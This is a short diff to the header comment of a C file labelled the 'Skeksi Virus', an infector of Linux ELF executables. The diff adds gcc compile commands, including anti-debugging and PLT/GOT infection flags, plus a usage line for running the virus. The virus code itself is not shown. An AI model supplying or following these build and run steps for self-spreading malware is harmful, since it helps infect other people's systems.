@@ -1,6 +1,14 @@
 /*
  * Skeksi Virus v0.1 - infects files that are ELF_X86_64 Linux ET_EXEC's
  * Written by ElfMaster - ryan@bitlackeys.org
+ *
+ * Compile:
+ * gcc -g -O0 -DANTIDEBUG -DINFECT_PLTGOT  -fno-stack-protector -c virus.c -fpic -o virus.o
+ * gcc -N -fno-stack-protector -nostdlib virus.o -o virus
+ *
+ * Usage:
+ * ./virus
+ *
  */
 
 #include <stdio.h>
